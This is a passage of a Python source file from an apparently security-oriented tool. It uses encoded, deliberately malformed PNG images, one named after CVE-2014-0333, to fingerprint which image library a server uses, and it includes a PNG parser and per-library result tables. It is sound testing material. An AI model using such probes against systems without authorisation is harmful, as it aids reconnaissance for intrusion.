uk+5wmUieOkYTY5k8IxMoyusU/ZdG7YJkluEcVBlHN+RmMaJtJGLaF96B\nFa074rOgEXHnCeFOgy002jvXdC8em6m4XgzG/U758KJNSmPVPdfjmx1dWoy3S9psR344KC5NbsSe\nsITpOZ6+3Xsm8ZCabD4GVq6EH1y2KQFzDnIObQ6YnGdL1NE4cw7955PONCxt/OT0OTT6dZjj/x9y\nz8YrRvaSkeVhupukYBTywW/ejqsK+Hb/3wcQRgU=\n'.decode("base64").decode("zlib"),
        'unknown_critical_chunk_bad_checksum': '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\n'.decode("base64").decode("zlib"),
    }


class FingerpingXpng:

    class Chunk:
        def __init__(self, size, name, content, checksum, offset):
            self.size = size
            self.name = name
            self.content = content
            self.checksum = checksum
            self.offset = offset

    def __init__(self, content):
        self.content = content

        self.valid = 0

        self.chunks = None

        self.width = 0
        self.height = 0
        self.colorDepth = 0
        self.colorType = 0
        self.compressionMethod = 0
        self.filterMethod = 0
        self.interlaceMethod = 0

        self.filters_used = set()
        self.pixels = []
        self.zlevel = 0

        self._check_validity()

    # Private methods to setup this object

    def _check_validity(self):
        """
        Reads the content and tries to decode it
        valid can take several values from 0 to 10 depending on how 'valid' the PNG file is
        valid == 0 => the file doesn't exist or is empty
        valid == 10 => the file is at least structurally correct
        """
        if self.content:
            self.valid = 1
            if self.content.startswith('\x89PNG'):
                self.valid = 2
                try:
                    self._parse_chunks()
                    self.valid = 3
                    self._properties()
                    self.valid = 4
                    self._unfilter()
                    self.valid = 10
                except Exception:
                    # This happens quiet frequently:
                    # index out of range: 37
                    # index out of range: 255
                    # index out of range: 37
                    # index out of range: 128
                    # java.util.zip.DataFormatException: incorrect header check
                    # java.util.zip.DataFormatException: incorrect data check
                    # java.util.zip.DataFormatException: incorrect header check
                    # index out of range: 0
                    # java.util.zip.DataFormatException: invalid window size
                    # index out of range: 1
                    # unpack str size does not match format
                    # unpack str size does not match format
                    # index out of range: 65
                    # java.util.zip.DataFormatException: incorrect header check
                    # unpack_from str size does not match format
                    # unpack_from str size does not match format
                    # print e
                    pass

    def _parse_chunks(self):
        """Parses all the chunks in the PNG file until it reaches IEND"""
        self.chunks = []
        offset = 8
        chunk = FingerpingXpng.Chunk(0, "", 0, 0, 0)
        while chunk.name != "IEND":
            chunk = self._parse_chunk(self.content, offset)
            self.chunks.append(chunk)
            offset += chunk.size + 12

    def _parse_chunk(self, data, offset):
        """Gets binary data in input and returns a representation as a Chunk named tuple"""
        start = offset
        size, name = struct.unpack_from("!I4s", data, start)
        start += 8
        content = data[start:start + size]
        start += size
        checksum = struct.unpack_from("!I", data, start)[0]
        return FingerpingXpng.Chunk(size, name, content, checksum, offset)

    def _chunk_checksum(self, name, content):
        """returns the crc32 of a chunk named tuple"""
        return binascii.crc32(name + content) & 0xffffffff

    def _verify_checksum(self, chunk):
        """Returns True if the checksum of the passed Chunk is correct"""
        return chunk.checksum == self._chunk_checksum(chunk.name, chunk.content)

    def _verify_checksums(self):
        """Returns True is the checksum of all the chunks in the image are correct"""
        for chunk in self.chunks:
            if not self._verify_checksum(chunk):
                return False
        return True

    def _get_chunk(self, name, index=0):
        """
        Returns a chunk which name corresponds to the name parameter.
        A PNG file can have several chunks with the same name, so there is also an index parameter
        """
        currentIndex = 0
        for chunk in self.chunks:
            if chunk.name == name:
                if currentIndex == index:
                    return chunk
                else:
                    currentIndex += 1
        return None

    def _generate_chunk_blob(self, chunk):
        """Returns the binary representation of a Chunk named tuple"""
        blob = struct.pack("!L4s", chunk.size, chunk.name)
        blob += chunk.content
        blob += struct.pack("!L", chunk.checksum)
        return blob

    def _get_chunk_blob(self, name, index=0):
        """Returns the binary representation of a Chunk named tuple given its name and index"""
        chunk = self._get_chunk(name, index)
        if chunk == None:
            return None
        return self._generate_chunk_blob(chunk)

    def _properties(self):
        """Extracts the properties of the image from the ihdr chunk"""
        ihdr = self._get_chunk('IHDR')
        self.width, self.height, self.colorDepth, self.colorType, self.compressionMethod, self.filterMethod, self.interlaceMethod = struct.unpack(
            "!IIBBBBB", ihdr.content)

    def _pixel_size(self):
        """Returns the size in bytes of a pixel, which depends on image type and bit depth"""
        if self.colorType == 3:
            return 1
        else:
            size = [1, 0, 3, 1, 2, 0, 4]
            return (self.colorDepth / 8.0) * size[self.colorType]

    def _decompress(self):
        """
        concatenates all the IDAT chunks and then decompresses the resulting zlib blob
        also extracts the zlib compression level
        """
        finished = False
        compressed = ""
        index = 0
        while not finished:
            chunk = self._get_chunk('IDAT', index)
            if chunk == None:
                finished = True
            else:
                compressed += chunk.content
                index += 1
        self.zlevel = ord(compressed[1]) >> 6
        return bytearray(zlib.decompress(compressed))

    def _paeth(self, a, b, c):
        """paeth scanline compression filter"""
        p = a + b - c
        pa = abs(p - a)
        pb = abs(p - b)
        pc = abs(p - c)
        if pa <= pb and pa <= pc:
            pr = a
        elif pb <= pc:
            pr = b
        else:
            pr = c
        return pr

    def _type0(self, a, b, c, x):
        """type 0 scanline compression filter"""
        return list(x)

    def _type1(self, a, b, c, x):
        """type 1 scanline compression filter"""
        return map(lambda k: (k[0] + k[1]) % 256, zip(a, x))

    def _type2(self, a, b, c, x):
        """type 2 scanline compression filter"""
        return map(lambda k: (k[0] + k[1]) % 256, zip(b, x))

    def _type3(self, a, b, c, x):
        """type 3 scanline compression filter"""
        return map(lambda k: (((k[0] + k[1]) // 2) + k[2]) % 256, zip(a, b, x))

    def _type4(self, a, b, c, x):
        """type 4 scanline compression filter"""
        return map(lambda k: (self._paeth(k[0], k[1], k[2]) + k[3]) % 256, zip(a, b, c, x))

    def _unfilter_line(self, line, prior=None):
        """
        Removes the PNG compression filter from a scanline
        A byte representing the compressed filter type is prepended to each scanline
        returns a list of pixels. Each pixel is a list of samples (e.g. [r,g,b])
        """
        filter_type, data = line[0], line[1:]
        # keep a list of the filters used by the compressor for fingerprinting purposes
        self.filters_used.add(filter_type)
        ps = int(max(1, self._pixel_size()))  # pixel size for filtering purposes is always >= 1 byte
        unfiltered = []
        zeropixel = [0 for x in range(ps)]
        if prior == None:
            prior = [zeropixel for x in range(len(data) // ps)]

        a = zeropixel
        c = zeropixel

        filters = [self._type0, self._type1, self._type2, self._type3, self._type4]
        filter_func = filters[filter_type]

        # Unfilter each pixel
        for i in range(len(data) // ps):
            x = list(data[i * ps:(i + 1) * ps])
            b = prior[i]
            recon = filter_func(a, b, c, x)
            a = recon
            c = b
            unfiltered.append(recon)
        return unfiltered

    def _unfilter(self):
        """
        Unfilters the whole image
        The result self.pixels is a list of rows, containing a list of pixels containing a list of samples'
        """
        prior = None
        ps = self._pixel_size()
        line_size = int(round(ps * self.width)) + 1
        filtered = self._decompress()
        for y in range(self.height):
            line = filtered[y * line_size:(y + 1) * line_size]
            unfiltered = self._unfilter_line(line, prior)
            self.pixels.append(unfiltered)
            prior = unfiltered

    # Setup methods finish here. Starting with private methods called by public methods.

    def _get_palette_colors(self):
        """
        Returns a list of all the colors in an indexed image
        It doesn't take into account if the color is actually used in the image
        """
        plte = self._get_chunk("PLTE")
        plteBytes = bytearray(plte.content)
        colors = []
        for x in xrange(0, plte.size, 3):
            colors.append([plteBytes[x], plteBytes[x + 1], plteBytes[x + 2]])
        return colors

    def _get_pixel_rgb(self, x, y):
        """
        Returns the RGB value of a pixel in the image given its coordinates
        if the image is indexed, the pixel color is looked up in the palette
        alpha is discarded
        """
        if not self.colorDepth == 8:
            return None
        if not self.pixels:
            return None
        if not self.pixels[y]:
            return None
        value = self.pixels[y][x]
        if self.colorType == 2:
            return value
        elif self.colorType == 6:
            return value[0:3]
        elif self.colorType == 3:
            return self._get_palette_colors()[value[0]]

    def _has_color(self, color):
        """Check if the image contains a particular color"""
        if not self.colorDepth == 8:
            return False
        if self.colorType == 2:
            return color in itertools.chain(*self.pixels)
        elif self.colorType == 6:
            return color in map(lambda x: [x[0], x[1], x[2]], itertools.chain(*self.pixels))
        elif self.colorType == 3:
            return color in self._get_palette_colors()

    def _generate_chunk(self, name, data):
        """Generate a chunk from name and data (for saving)"""
        return FingerpingXpng.Chunk(len(data), name, data, self._chunk_checksum(name, data), 0)

    def _generate_idat(self):
        """Generate the IDAT chunk from the pixels (for saving)"""
        data = ""
        for line in self.pixels:
            data += '\0'
            data += str(bytearray(itertools.chain(*line)))
        compressed = zlib.compress(data)
        idat = self._generate_chunk_blob(self._generate_chunk("IDAT", compressed))
        return idat

    def _get_blob(self):
        """returns the binary representation of the image in PNG format"""
        blob = "\x89PNG\x0d\x0a\x1a\x0a"
        blob += self._get_chunk_blob("IHDR")
        plte = self._get_chunk_blob("PLTE")
        if not plte == None:
            blob += plte
        blob += self._generate_idat()
        blob += self._get_chunk_blob("IEND")
        return blob

    # Public methods start from here

    def save(self, file_name):
        """Save the image in PNG format (used to verify that the image decoding works correctly)"""
        with open(file_name, 'wb') as f:
            f.write(self._get_blob())

    # Fingerprinting/test functions, referenced in tests.py
    # TODO feature: As soon as we implement JPEG as well, we need to add a parent class that implements the following functions

    def conversion_success(self):
        """
        The most simple fingerprinting function
        Returns 0 if the image is absent or empty (meaning the target failed to decode the input image)
        Returns 10 if the image looks valid at least in surface
        Returns between 1 and 9 if the image is corrupt
        """
        return self.valid

    # All the following fingerprint/test functions should return values > 10 (or any kind of object like a list actually)

    def correct_checksums(self):
        """Fingerprint depending on the correctness of the checksums of the output image"""
        if self._verify_checksums():
            return 11
        else:
            return 12

    def filters_used(self):
        """Fingerprint resulting from the set of filters used in the scanlines of the output image (returns a sorted list of the filters)"""
        return sorted(self.filters_used)

    def palette_used(self):
        """Fingerprint depending on the palette used to decode images with two palettes (when not rejected)"""
        if self._has_color([185, 96, 142]):
            return 11
        elif self._has_color([96, 142, 185]):
            return 12
        else:
            return 13

    def gamma(self):
        """Fingerprint depending on how the decoder treated the gamma information from the input image"""
        pixel = self._get_pixel_rgb(120, 140)
        if pixel[0] + pixel[1] + pixel[2] < 96:
            return 11
        else:
            chunk = self._get_chunk("gAMA")
            if chunk == None:
                return 12
            gammav = struct.unpack("!I", chunk.content)
            if gammav[0] == 400000:
                return 13
            return 14

    def ihdr_used(self):
        """Fingerprint depending on the ihdr used to decode images with two ihdr (when not rejected)"""
        if self.width == 252:
            return 11
        elif self.width == 189:
            return 12
        else:
            return 13

    def bad_idat_filter(self):
        """Fingerprint depending on the treatment of images with invalid scanline filters"""
        pixel = self._get_pixel_rgb(5, 0)
        if pixel == [65, 83, 255]:
            return 11  # Most libraries return the correct image
        elif pixel == [57, 82, 255]:
            return 12  # One library outputs a corrupted image
        return 13

    def zlib_compression(self):
        """Fingerprint depending on the zlib compression level flag of the output image"""
        return 11 + self.zlevel

    def phys_chunk(self):
        """Fingerprint depending on how the decoder treated the phys information in the input image"""
        chunk = self._get_chunk("pHYs")
        if chunk == None:
            return 11
        x, y, u = struct.unpack("!IIB", chunk.content)
        if x == 1:
            return 12
        if x == 1500:
            return 13
        if x == 1499:
            return 14  # .net
        return 15

    def truecolor_trns(self):
        """Fingerprint depending on how the decoder treated an input image with a tRNS chunk"""
        if self.colorType == 6:
            return 11
        chunk = self._get_chunk("tRNS")
        if chunk == None:
            return 12
        return 13


class FingerpingFingerprint:
    def __init__(self, name, description, results):
        self.name = name
        self.description = description
        self.results = results


class FingerpingFingerprints:
    all_fingerprints = [
        FingerpingFingerprint("Common error case of UploadScanner (ImageMagick 6.5.4-10 resize)", "Occurs when the server overwrites the same file name again and again but keeps the old content if image transformation fails.",
                             {'Compression': 14, 'two_plte_chunk': 13, 'modified_phys': 13, 'unknown_critical_chunk': 10, 'idat_bad_zlib_method': 10, 'transparent_bkdred': 11, 'unknown_critical_chunk_bad_checksum': 10, 'chunk_with_number_in_name_before_idat': 10, 'ihdr_too_long': 10, 'indexed_no_plte': 10, 'control_rgba': 10, 'ihdr_invalid_filter_method': 10, 'truncated_chunk': 10, 'ihdr_height_0': 10, 'ihdr_widthheight0': 10, 'two_ihdr_chunk': 13, 'filters indexed': [1, 2, 4], 'gamma_four_and_srgb': 0, 'junk_after_iend': 10, 'truecolor_trns_chunk': 11, 'control_8bit_i': 10, 'png48': 10, 'invalid_length_iend': 10, 'Checksums': 11, 'first_idat_empty': 10, 'idat_junk_after_lz': 10, 'ihdr_too_short': 10, 'truecolor_alpha_trns_chunk': 11, 'idat_empty_zlib_object': 10, 'control_grayscale': 10, 'idat_bad_zlib_checkbits': 10, 'CVE-2014-0333': 10, 'ihdr_width_0': 10, 'invalid_iccp_2': 10, 'invalid_iccp_1': 10, 'mng_file': 10, 'jng_file': 10, 'no_iend': 10, 'nonconsecutive_idat': 10, 'transparent_truncated_palette': 10, 'invalid_name_ancillary_public_chunk_before_idat_bad_checksum': 10, 'invalid_name_reserved_bit_ancillary_public_chunk_before_idat': 10, 'gamma_four_nosrgb': 0, 'ihdr_invalid_compression_method': 10, 'invalid_name_ancillary_public_chunk_before_idat': 10, 'CESA-2004-001': 10, 'idat_bad_filter': 13, 'control_8bit': 10, 'iend_before_idat': 10, 'ihdr_not_first_chunk': 10, 'idat_bad_zlib_checksum': 10, 'grayscale_with_plte': 10, 'plte_after_idat': 10, 'filters RGB': [1, 2, 4], 'invalid_name_ancillary_private_chunk_before_idat': 10, 'idat_too_much_data': 10, 'black_white': 10, 'ios_cgbl_chunk': 10, 'png64': 10, 'idat_zlib_invalid_window': 10}),

        FingerpingFingerprint("No processing (server returns images unmodified)", "Servers that do not modify the image have this kind of behavior.",
                              {'Compression': 12, 'two_plte_chunk': 11, 'modified_phys': 13, 'unknown_critical_chunk': 10, 'idat_bad_zlib_method': 4, 'transparent_bkdred': 13, 'unknown_critical_chunk_bad_checksum': 10, 'chunk_with_number_in_name_before_idat': 10, 'ihdr_too_long': 3, 'indexed_no_plte': 10, 'control_rgba': 10, 'ihdr_invalid_filter_method': 10, 'truncated_chunk': 2, 'ihdr_height_0': 10, 'ihdr_widthheight0': 10, 'two_ihdr_chunk': 11, 'filters indexed': [0], 'gamma_four_and_srgb': 13, 'junk_after_iend': 10, 'truecolor_trns_chunk': 13, 'control_8bit_i': 4, 'png48': 10, 'invalid_length_iend': 10, 'Checksums': 11, 'first_idat_empty': 10, 'idat_junk_after_lz': 10, 'ihdr_too_short': 3, 'truecolor_alpha_trns_chunk': 11, 'idat_empty_zlib_object': 4, 'control_grayscale': 10, 'idat_bad_zlib_checkbits': 4, 'CVE-2014-0333': 4, 'ihdr_width_0': 4, 'invalid_iccp_2': 10, 'invalid_iccp_1': 10, 'mng_file': 0, 'jng_file': 0, 'no_iend': 2, 'nonconsecutive_idat': 10, 'transparent_truncated_palette': 10, 'invalid_name_ancillary_public_chunk_before_idat_bad_checksum': 10, 'invalid_name_reserved_bit_ancillary_public_chunk_before_idat': 10, 'gamma_four_nosrgb': 0, 'ihdr_invalid_compression_method': 10, 'invalid_name_ancillary_public_chunk_before_idat': 10, 'CESA-2004-001': 10, 'idat_bad_filter': 13, 'control_8bit': 10, 'iend_before_idat': 4, 'ihdr_not_first_chunk': 10, 'idat_bad_zlib_checksum': 4, 'grayscale_with_plte': 10, 'plte_after_idat': 10, 'filters RGB': [0], 'invalid_name_ancillary_private_chunk_before_idat': 10, 'idat_too_much_data': 10, 'black_white': 4, 'ios_cgbl_chunk': 4, 'png64': 10, 'idat_zlib_invalid_window': 4}),

        FingerpingFingerprint("Dart", "Dart Image 1.1.21 https://pub.dartlang.org/packages/image",
                              {'black_white': 10, 'control_8bit_i': 10, 'Compression': 11, 'ihdr_too_long': 10, 'ihdr_height_0': 10, 'invalid_name_reserved_bit_ancillary_public_chunk_before_idat': 10, 'idat_bad_zlib_method': 0, 'truecolor_trns_chunk': 11, 'gamma_four_and_srgb': 11, 'truecolor_alpha_trns_chunk': 11, 'invalid_length_iend': 10, 'nonconsecutive_idat': 10, 'filters RGB': [4], 'ihdr_width_0': 0, 'unknown_critical_chunk_bad_checksum': 10, 'two_plte_chunk': 12, 'idat_bad_filter': 0, 'CESA-2004-001': 0, 'ihdr_widthheight0': 10, 'no_iend': 0, 'jng_file': 10, 'control_8bit': 10, 'transparent_truncated_palette': 10, 'filters indexed': [4], 'transparent_bkdred': 11, 'two_ihdr_chunk': 12, 'idat_too_much_data': 10, 'invalid_name_ancillary_public_chunk_before_idat': 10, 'idat_empty_zlib_object': 0, 'truncated_chunk': 0, 'png64': 10, 'idat_junk_after_lz': 10, 'invalid_iccp_2': 10, 'ihdr_not_first_chunk': 10, 'control_rgba': 10, 'chunk_with_number_in_name_before_idat': 10, 'first_idat_empty': 10, 'invalid_name_ancillary_public_chunk_before_idat_bad_checksum': 10, 'png48': 10, 'unknown_critical_chunk': 10, 'iend_before_idat': 0, 'invalid_iccp_1': 10, 'idat_bad_zlib_checksum': 0, 'modified_phys': 11, 'invalid_name_ancillary_private_chunk_before_idat': 10, 'mng_file': 0, 'grayscale_with_plte': 10, 'ihdr_too_short': 0, 'gamma_four_nosrgb': 11, 'junk_after_iend': 10, 'indexed_no_plte': 0, 'plte_after_idat': 10, 'ihdr_invalid_compression_method': 10, 'idat_bad_zlib_checkbits': 0, 'CVE-2014-0333': 10, 'ios_cgbl_chunk': 0, 'Checksums': 11, 'control_grayscale': 10, 'idat_zlib_invalid_window': 10, 'ihdr_invalid_filter_method': 0}),

        FingerpingFingerprint(".Net 4.5", ".Net 4.5",
                              {'black_white': 4, 'control_8bit_i': 10, 'Compression': 12, 'ihdr_too_long': 10, 'ihdr_height_0': 0, 'invalid_name_reserved_bit_ancillary_public_chunk_before_idat': 10, 'idat_bad_zlib_method': 0, 'truecolor_trns_chunk': 11, 'gamma_four_and_srgb': 14, 'truecolor_alpha_trns_chunk': 11, 'invalid_length_iend': 10, 'nonconsecutive_idat': 10, 'filters RGB': [0], 'ihdr_width_0': 0, 'unknown_critical_chunk_bad_checksum': 10, 'two_plte_chunk': 11, 'idat_bad_filter': 11, 'CESA-2004-001': 0, 'ihdr_widthheight0': 0, 'no_iend': 10, 'jng_file': 0, 'control_8bit': 10, 'transparent_truncated_palette': 10, 'filters indexed': [0], 'transparent_bkdred': 11, 'two_ihdr_chunk': 11, 'idat_too_much_data': 10, 'invalid_name_ancillary_public_chunk_before_idat': 10, 'idat_empty_zlib_object': 0, 'truncated_chunk': 10, 'png64': 10, 'idat_junk_after_lz': 10, 'invalid_iccp_2': 10, 'ihdr_not_first_chunk': 10, 'control_rgba': 10, 'chunk_with_number_in_name_before_idat': 10, 'first_idat_empty': 10, 'invalid_name_ancillary_public_chunk_before_idat_bad_checksum': 10, 'png48': 10, 'unknown_critical_chunk': 10, 'iend_before_idat': 0, 'invalid_iccp_1': 10, 'idat_bad_zlib_checksum': 0, 'modified_phys': 14, 'invalid_name_ancillary_private_chunk_before_idat': 10, 'mng_file': 0, 'grayscale_with_plte': 10, 'ihdr_too_short': 0, 'gamma_four_nosrgb': 13, 'junk_after_iend': 10, 'indexed_no_plte': 0, 'plte_after_idat': 10, 'ihdr_invalid_compression_method': 10, 'idat_bad_zlib_checkbits': 0, 'CVE-2014-0333': 10, 'ios_cgbl_chunk': 0, 'Checksums': 11, 'control_grayscale': 10, 'idat_zlib_invalid_window': 0, 'ihdr_invalid_filter_method': 10}),

        FingerpingFingerprint("Erlang erl_img", "Erlang erl_img evanmiller fork https://github.com/evanmiller/erl_img",
                              {'black_white': 0, 'control_8bit_i': 10, 'Compression': 13, 'ihdr_too_long': 10, 'ihdr_height_0': 10, 'invalid_name_reserved_bit_ancillary_public_chunk_before_idat': 10, 'idat_bad_zlib_method': 0, 'truecolor_trns_chunk': 13, 'gamma_four_and_srgb': 12, 'truecolor_alpha_trns_chunk': 0, 'invalid_length_iend': 0, 'nonconsecutive_idat': 10, 'filters RGB': [0], 'ihdr_width_0': 0, 'unknown_critical_chunk_bad_checksum': 10, 'two_plte_chunk': 12, 'idat_bad_filter': 0, 'CESA-2004-001': 0, 'ihdr_widthheight0': 10, 'no_iend': 0, 'jng_file': 0, 'control_8bit': 10, 'transparent_truncated_palette': 10, 'filters indexed': [0], 'transparent_bkdred': 13, 'two_ihdr_chunk': 11, 'idat_too_much_data': 10, 'invalid_name_ancillary_public_chunk_before_idat': 10, 'idat_empty_zlib_object': 4, 'truncated_chunk': 0, 'png64': 10, 'idat_junk_after_lz': 10, 'invalid_iccp_2': 10, 'ihdr_not_first_chunk': 0, 'control_rgba': 10, 'chunk_with_number_in_name_before_idat': 10, 'first_idat_empty': 10, 'invalid_name_ancillary_public_chunk_before_idat_bad_checksum': 10, 'png48': 10, 'unknown_critical_chunk': 10, 'iend_before_idat': 0, 'invalid_iccp_1': 10, 'idat_bad_zlib_checksum': 0, 'modified_phys': 13, 'invalid_name_ancillary_private_chunk_before_idat': 10, 'mng_file': 0, 'grayscale_with_plte': 10, 'ihdr_too_short': 0, 'gamma_four_nosrgb': 12, 'junk_after_iend': 10, 'indexed_no_plte': 2, 'plte_after_idat': 10, 'ihdr_invalid_compression_method': 10, 'idat_bad_zlib_checkbits': 0, 'CVE-2014-0333': 10, 'ios_cgbl_chunk': 0, 'Checksums': 11, 'control_grayscale': 10, 'idat_zlib_invalid_window': 0, 'ihdr_invalid_filter_method': 10}),

        FingerpingFingerprint("Go 1.0.2", "go 1.0.2",
                              {'black_white': 10, 'control_8bit_i': 0, 'Compression': 13, 'ihdr_too_long': 0, 'ihdr_height_0': 0, 'invalid_name_reserved_bit_ancillary_public_chunk_before_idat': 0, 'idat_bad_zlib_method': 0, 'truecolor_trns_chunk': 0, 'gamma_four_and_srgb': 12, 'truecolor_alpha_trns_chunk': 0, 'invalid_length_iend': 0, 'nonconsecutive_idat': 0, 'filters RGB': [1, 2, 4], 'ihdr_width_0': 0, 'unknown_critical_chunk_bad_checksum': 0, 'two_plte_chunk': 0, 'idat_bad_filter': 0, 'CESA-2004-001': 0, 'ihdr_widthheight0': 0, 'no_iend': 0, 'jng_file': 0, 'control_8bit': 10, 'transparent_truncated_palette': 0, 'filters indexed': [1, 2, 3, 4], 'transparent_bkdred': 13, 'two_ihdr_chunk': 0, 'idat_too_much_data': 0, 'invalid_name_ancillary_public_chunk_before_idat': 10, 'idat_empty_zlib_object': 0, 'truncated_chunk': 0, 'png64': 10, 'idat_junk_after_lz': 10, 'invalid_iccp_2': 10, 'ihdr_not_first_chunk': 10, 'control_rgba': 10, 'chunk_with_number_in_name_before_idat': 10, 'first_idat_empty': 10, 'invalid_name_ancillary_public_chunk_before_idat_bad_checksum': 0, 'png48': 10, 'unknown_critical_chunk': 10, 'iend_before_idat': 0, 'invalid_iccp_1': 10, 'idat_bad_zlib_checksum': 0, 'modified_phys': 11, 'invalid_name_ancillary_private_chunk_before_idat': 10, 'mng_file': 0, 'grayscale_with_plte': 0, 'ihdr_too_short': 0, 'gamma_four_nosrgb': 12, 'junk_after_iend': 10, 'indexed_no_plte': 0, 'plte_after_idat': 0, 'ihdr_invalid_compression_method': 0, 'idat_bad_zlib_checkbits': 0, 'CVE-2014-0333': 0, 'ios_cgbl_chunk': 0, 'Checksums': 11, 'control_grayscale': 10, 'idat_zlib_invalid_window': 10, 'ihdr_invalid_filter_method': 0}),

        FingerpingFingerprint("Haskell JuicyPixels", "Haskell JuicyPixels 3.1.5.2 https://hackage.haskell.org/package/JuicyPixels",
                              {'black_white': 10, 'control_8bit_i': 10, 'Compression': 13, 'ihdr_too_long': 0, 'ihdr_height_0': 10, 'invalid_name_reserved_bit_ancillary_public_chunk_before_idat': 0, 'idat_bad_zlib_method': 0, 'truecolor_trns_chunk': 12, 'gamma_four_and_srgb': 12, 'truecolor_alpha_trns_chunk': 11, 'invalid_length_iend': 10, 'nonconsecutive_idat': 10, 'filters RGB': [0], 'ihdr_width_0': 10, 'unknown_critical_chunk_bad_checksum': 0, 'two_plte_chunk': 11, 'idat_bad_filter': 11, 'CESA-2004-001': 0, 'ihdr_widthheight0': 10, 'no_iend': 0, 'jng_file': 0, 'control_8bit': 10, 'transparent_truncated_palette': 10, 'filters indexed': [0], 'transparent_bkdred': 11, 'two_ihdr_chunk': 11, 'idat_too_much_data': 10, 'invalid_name_ancillary_public_chunk_before_idat': 10, 'idat_empty_zlib_object': 0, 'truncated_chunk': 0, 'png64': 10, 'idat_junk_after_lz': 10, 'invalid_iccp_2': 10, 'ihdr_not_first_chunk': 0, 'control_rgba': 10, 'chunk_with_number_in_name_before_idat': 10, 'first_idat_empty': 10, 'invalid_name_ancillary_public_chunk_before_idat_bad_checksum': 0, 'png48': 10, 'unknown_critical_chunk': 10, 'iend_before_idat': 0, 'invalid_iccp_1': 10, 'idat_bad_zlib_checksum': 0, 'modified_phys': 11, 'invalid_name_ancillary_private_chunk_before_idat': 10, 'mng_file': 0, 'grayscale_with_plte': 10, 'ihdr_too_short': 0, 'gamma_four_nosrgb': 12, 'junk_after_iend': 10, 'indexed_no_plte': 0, 'plte_after_idat': 10, 'ihdr_invalid_compression_method': 10, 'idat_bad_zlib_checkbits': 0, 'CVE-2014-0333': 10, 'ios_cgbl_chunk': 0, 'Checksums': 11, 'control_grayscale': 10, 'idat_zlib_invalid_window': 0, 'ihdr_invalid_filter_method': 10}),

        FingerpingFingerprint("ImageMagick 6.7.7-10", "ImageMagick 6.7.7-10 2013-09-10 Q16",
